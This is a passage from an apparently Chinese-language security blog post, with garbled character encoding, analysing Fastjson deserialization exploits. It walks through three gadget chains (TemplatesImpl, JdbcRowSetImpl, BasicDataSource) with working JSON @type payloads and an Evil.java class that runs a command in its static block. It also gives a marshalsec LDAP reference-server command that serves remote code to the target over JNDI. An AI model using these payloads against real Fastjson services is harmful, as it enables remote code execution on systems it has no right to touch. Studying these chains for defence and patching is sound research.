class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Tom&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> JSON.toJSONString((person1));<br>        System.out.println(str1);<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Lisa&quot;</span>, <span class="hljs-number">20</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(person2, SerializerFeature.WriteClassName);<br>        System.out.println(str2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>getAge</p><p>getName</p><p>{â€œageâ€:18,â€nameâ€:â€Tomâ€}</p><p>getAge</p><p>getName</p><p>{â€œ@typeâ€:â€org.example.Personâ€,â€ageâ€:20,â€nameâ€:â€Lisaâ€}</p></blockquote><h3 id="JSON-POJO"><a href="#JSON-POJO" class="headerlink" title="JSON &#x3D;&gt; POJO"></a>JSON &#x3D;&gt; POJO</h3><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.parseObject()<br></code></pre></td></tr></table></figure><p>å‚æ•°è®¾ç½®ï¼š</p><ul><li>Feature.SupportNonPublicField ååºåˆ—åŒ–æ—¶ï¼ŒåŠ ä¸Šè¯¥å‚æ•°æ‰èƒ½è¿˜åŸprivateå±æ€§</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> org.example.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Lisa\&quot;&#125;&quot;</span>, Person.class, Feature.SupportNonPublicField);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Non-Arg Constructor</p><p>setAge</p><p>setName</p><p>I am Lisa and 20 years old</p></blockquote><h3 id="parse-vs-parseObject"><a href="#parse-vs-parseObject" class="headerlink" title="parse vs parseObject"></a>parse vs parseObject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Lisa\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parse(s);<br>        System.out.println(obj1);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> JSON.parseObject(s);<br>        System.out.println(obj2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Non-Arg Constructor</p><p>setAge</p><p>setName</p><p>I am Lisa and 20 years old</p><p>Non-Arg Constructor</p><p>setAge</p><p>setName</p><p>getAge</p><p>getName</p><p>{â€œnameâ€:â€Lisaâ€,â€ageâ€:20}</p></blockquote><p>å¯ä»¥çœ‹åˆ°<code>JSON.parseObject()</code>çš„æ‰“å°ç»“æœå’Œæˆ‘ä»¬å®šä¹‰çš„<code>toString()</code>ä¸åŒï¼Œè¯´æ˜å®ƒä¸æ˜¯Personå¯¹è±¡ã€‚ï¼ˆå®é™…ä¸Šå¾—åˆ°çš„æ˜¯JSONObjectç±»å¯¹è±¡ï¼‰</p><p>ç»“è®ºï¼š</p><ul><li>parse()ä¼š<strong>è¯†åˆ«</strong>å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„setteræ–¹æ³•</li><li>parseObject()ä¼šè§¦å‘ç›®æ ‡ç±»çš„getterå’Œsetteræ–¹æ³•</li></ul><p><strong>å› æ­¤è‹¥èƒ½æ‰¾åˆ°ä¸€ä¸ªç±»ã€åœ¨ååºåˆ—åŒ–è¿™ä¸ªç±»å¯¹è±¡æ—¶ï¼Œfastjsonè°ƒç”¨å…¶setteræˆ–getteræ–¹æ³•ï¼Œä¸”setteræˆ–getteræ–¹æ³•å­˜åœ¨æ¼æ´ï¼Œå°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</strong></p><p>ä¸‹é¢å†åˆ—ä¸¾ä¸€äº›FastJsonçš„ç»“è®ºï¼Œåœ¨åç»­è°ƒè¯•ä¸­å¯ä»¥è§‚å¯Ÿå¾—åˆ°ï¼š</p><ul><li><code>JSON.parse(jsonString)</code> å’Œ <code>JSON.parseObject(jsonString, Target.class)</code>ï¼Œå‰è€…ä¼šåœ¨ jsonString ä¸­è§£æå­—ç¬¦ä¸²è·å– <code>@type</code> æŒ‡å®šçš„ç±»ï¼Œåè€…åˆ™ä¼šç›´æ¥ä½¿ç”¨å‚æ•°ä¸­çš„classã€‚</li><li><code>JSON.parseObject(jsonString)</code> å°†ä¼šè¿”å› JSONObject å¯¹è±¡ï¼Œä¸”ç±»ä¸­çš„æ‰€æœ‰ getter ä¸ setter éƒ½è¢«è°ƒç”¨ã€‚</li><li>å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨ <code>Feature.SupportNonPublicField</code> å‚æ•°ã€‚</li><li>fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœ Field ç±»å‹ä¸º <code>byte[]</code>ï¼Œå°†ä¼šè°ƒç”¨<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> è¿›è¡Œ base64 è§£ç ï¼Œå¯¹åº”çš„ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œ base64 ç¼–ç ã€‚</li><li>fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾ get&#x2F;set æ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•° <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> æ–¹æ³•ï¼Œä¼šå¿½ç•¥ <code>_ | -</code> å­—ç¬¦ä¸²ï¼Œå‡å¦‚å­—æ®µåå« <code>_a_g_e_</code>ï¼Œgetter æ–¹æ³•ä¸º <code>getAge()</code>ï¼Œfastjson ä¹Ÿå¯ä»¥æ‰¾å¾—åˆ°ã€‚</li></ul><p>é…ç½®ç±»ï¼š</p><p><code>com.alibaba.fastjson.parser.ParserConfig</code>ï¼šåé¢çš„AutoTypeå¼€å…³å’Œé»‘åå•ä½“ç°åœ¨è¿™ä¸ªç±»ä¸­</p><p>æ»¡è¶³æ¡ä»¶çš„setterï¼š</p><ul><li>å‡½æ•°åå¤§äºç­‰äº4</li><li>éé™æ€å‡½æ•°</li><li>ä»¥setå¼€å¤´ä¸”ç¬¬4ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»</li><li>å‚æ•°ä¸ªæ•°ä¸º1ä¸ª</li></ul><p>æ»¡è¶³æ¡ä»¶çš„getter</p><ul><li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4</li><li>éé™æ€æ–¹æ³•</li><li>ä»¥getå¼€å¤´ä¸”ç¬¬4ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>æ— å‚æ•°</li><li>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicInteger</li></ul><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>åœ¨å‰é¢çš„åŠ¨æ€å­—èŠ‚ç é‚£é‡Œæåˆ°è¿‡ï¼š</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»<br>    TransletClassLoader<br></code></pre></td></tr></table></figure><p>å­˜åœ¨ä½œç”¨åŸŸä¸º<code>default</code>çš„æ–¹æ³•<code>defineClass</code></p><p>æ‰¾åˆ°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><p>TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// TemplatesImpl#getOutputProperties()</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title function_">getOutputProperties</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> newTransformer().getOutputProperties();<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (TransformerConfigurationException e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// TemplatesImpl#newTransformer()</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span>&#123;<br>    TransformerImpl transformer;<br>    transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,<br>                                      _indentNumber, _tfactory);<br>&#125;<br><span class="hljs-comment">// TemplatesImpl#getTransletInstance()</span><br><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br>        <span class="hljs-comment">// ....</span><br>    &#125;<br>    <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br>        <span class="hljs-comment">// ...</span><br>&#125;<br><span class="hljs-comment">// TemplatesImpl#defineTransletClasses()</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//....</span><br>    <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span><br>        AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;TransletClassLoader&gt;() &#123;<br>            <span class="hljs-keyword">public</span> TransletClassLoader <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),<br>                                               _tfactory.getExternalExtensionsMap());<br>            &#125;<br>        &#125;);<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>        _class[i] = loader.defineClass(_bytecodes[i], pd);<br>        <span class="hljs-comment">// ....</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>defineTransletClasses</code>æ–¹æ³•ä¸­<code>_tfactory.getExternalExtensionsMap()</code> <code>_tfactory</code>æ˜¯<code>TransformerFactoryImpl</code>ç±» ä¸ºäº†ä¸æŠ›å‡ºå¼‚å¸¸éœ€è¦<code>_tfactory = new TransformerFactoryImpl()</code></li><li><code>getTransletInstance</code>æ–¹æ³•ä¸­åˆ¤æ–­<code>if (_name == null) return null;</code> æ‰€ä»¥è¦ç»™<code>_name</code>èµ‹å€¼ï¼ˆStringï¼‰</li></ul><p><code>TemplatesImpl</code> ä¸­å¯¹åŠ è½½çš„å­—èŠ‚ç æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼š</p><p>è¿™ä¸ªå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯**<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet </code>çš„å­ç±»ã€‚**</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getTransletInstance()é¦–å…ˆæ‰§è¡Œ defineTransletClasses()åŠ è½½ç±»åï¼Œè¿˜ä¼šå¯¹è¯¥ç±»è¿›è¡Œå®ä¾‹åŒ– (AbstractTranslet) _class[_transletIndex].newInstance();<br></code></pre></td></tr></table></figure><p>è€Œ<code>getOutputProperties()</code>æ­£æ˜¯<code>TemplatesImpl</code>çš„<code>_outputProperties</code>å±æ€§å¯¹åº”çš„getteræ–¹æ³•ã€‚</p><p>ç”±äºæ›´æ”¹çš„ä¸€äº›<code>TemplatesImpl</code>ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œéœ€è¦ä½¿ç”¨ <code>Feature.SupportNonPublicField</code> å‚æ•°ã€‚</p><h4 id="PayLoad"><a href="#PayLoad" class="headerlink" title="PayLoad"></a>PayLoad</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_bytecodes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;evilCode after Base64&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;taco&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_tfactory&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_outputProperties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Evil.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·å–Base64ç¼–ç åçš„Evil.classå­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getPayLoad</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        System.out.println(Base64.getEncoder().encodeToString(code));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å±€é™"><a href="#å±€é™" class="headerlink" title="å±€é™"></a>å±€é™</h4><p>éœ€è¦ <code>Feature.SupportNonPublicField</code> å‚æ•°</p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>ä¸Šæ–‡çš„<code>TemplatesImpl</code>é“¾å­˜åœ¨ä¸¥é‡é™åˆ¶ï¼Œå³<code>JSON.parse()</code>éœ€è¦å¼€å¯<code>Feature.SupportNonPublicField</code></p><p><code>JdbcRowSetImpl</code>é“¾æ˜¯åŸºäº JNDI+RMI æˆ– JDNI+LADP è¿›è¡Œæ”»å‡»ï¼Œä¼šæœ‰ä¸€å®šçš„JDKç‰ˆæœ¬é™åˆ¶ã€‚</p><blockquote><p>RMIåˆ©ç”¨çš„JDKç‰ˆæœ¬â‰¤ JDK 6u132ã€7u122ã€8u113</p><p>LADPåˆ©ç”¨JDKç‰ˆæœ¬â‰¤ 6u211 ã€7u201ã€8u191</p></blockquote><p><code>com.sun.rowset.JdbcRowSetImpl</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAutoCommit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> var1)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-built_in">this</span>.conn.setAutoCommit(var1);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">this</span>.conn = <span class="hljs-built_in">this</span>.connect();<br><span class="hljs-built_in">this</span>.conn = setAutoCommit(var1);<br>&#125;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å½“<code>conn == null</code>æ—¶ï¼Œè°ƒç”¨<code>connect()</code>:</p><p><img src="/2024/08/01/fastjson/image-20240801215837593.png" alt="image-20240801215837593"></p><p>ç»å…¸çš„<code>(new InitialContext()).lookup()</code>ï¼Œé‚£ä¹ˆåªè¦dataSourceNameè®¾ä¸ºæ¶æ„è¿œç¨‹RMIæœåŠ¡æˆ–ldapæœåŠ¡å³å¯ã€‚</p><blockquote><p>{</p><p> â€œ@typeâ€:â€com.sun.rowset.JdbcRowSetImplâ€,</p><p> â€œdataSourceNameâ€:â€ldap:&#x2F;&#x2F;127.0.0.1:8099&#x2F;evilâ€,</p><p> â€œautoCommitâ€:true</p><p>}</p></blockquote><p>å¯ä»¥åˆ©ç”¨marshalsecå¼€å¯ldapæœåŠ¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java -cp .\marshalsec-<span class="hljs-number">0.0</span><span class="hljs-number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="hljs-comment">//127.0.0.1:8000/#calc 8099</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/01/fastjson/image-20240801220859119.png" alt="image-20240801220859119"></p><h3 id="BasicDataSource"><a href="#BasicDataSource" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h3><p>fastjsonç½‘ä¼ çš„ä¸‰æ¡åˆ©ç”¨é“¾å¦‚ä¸‹ï¼š</p><ul><li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></li><li><code>com.sun.rowset.JdbcRowSetImpl</code></li><li><code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></li></ul><p>å‰é¢ä¸¤ä¸ªå·²ç»ä»‹ç»ï¼Œç°åœ¨è¿˜å‰©æœ€åä¸€ä¸ª<code>BasicDataSource</code>ã€‚</p><ol><li>å¸¸è§„çš„Javaå­—èŠ‚ç çš„æ‰§è¡Œï¼Œä½†æ˜¯éœ€è¦å¼€å¯<code>Feature.SupportNonPublicField</code>ï¼Œè¾ƒé¸¡è‚‹</li><li>åˆ©ç”¨JNDIæ³¨å…¥ï¼Œä½†éœ€è¦æœåŠ¡å™¨å‡ºç½‘</li><li>ä¸ç”¨å‡ºç½‘ä¹Ÿä¸ç”¨å¼€å¯<code>Feature.SupportNonPublicField</code></li><li>ä¾èµ–å¦‚ä¸‹</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.45<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>è°ƒç”¨é“¾ï¼š</strong></p><p><code>getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()-&gt;createDriver()</code></p><p><img src="/2024/08/01/fastjson/image-20240801222516262.png" alt="image-20240801222516262"></p><p><code>Class.forName</code>ç¬¬äºŒä¸ªå‚æ•°<code>initial</code>ä¸ºtrueæ—¶ï¼Œç±»åŠ è½½åå°†ä¼šç›´æ¥æ‰§è¡Œ<code>static&#123;&#125;</code>å—ä¸­çš„ä»£ç ã€‚</p><p><code>driverClassLoader</code>å’Œ<code>driverClassName</code>éƒ½å¯ä»¥é€šè¿‡fastjsonæ§åˆ¶</p><blockquote><p>{</p><p> {</p><p> â€œaaaâ€: {</p><p> â€œ@typeâ€: â€œorg.apache.tomcat.dbcp.dbcp2.BasicDataSourceâ€,</p><p> â€œdriverClassLoaderâ€: {</p><p> â€œ@typeâ€: â€œcom.sun.org.apache.bcel.internal.util.ClassLoaderâ€</p><p> },</p><p> â€œdriverClassNameâ€: â€œ$$BCEL$$$l$8b$I$A$â€¦â€</p><p> }</p><p> }: â€œbbbâ€</p><p>}</p></blockquote><p><img src="/2024/08/01/fastjson/image-20240801222607739.png" alt="image-20240801222607739"></p><p>å®é™…ä¸Šé¢çš„getConnectionä¸æ»¡è¶³fastjsonå¯¹è‡ªåŠ¨è°ƒç”¨getterçš„è¦æ±‚ï¼Œå‰é¢è¯´è¿‡ï¼š</p><blockquote><p>æ»¡è¶³æ¡ä»¶çš„getterï¼š</p><ul><li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4</li><li>éé™æ€æ–¹æ³•</li><li>ä»¥getå¼€å¤´ä¸”ç¬¬4ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>æ— å‚æ•°</li><li>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicInteger</li></ul></blockquote><p>åœ¨<code>&#123;&quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;â€¦â€¦&#125;</code> è¿™ä¸€æ•´æ®µå¤–é¢å†å¥—ä¸€å±‚<code>&#123;&#125;</code>ï¼Œè¿™æ 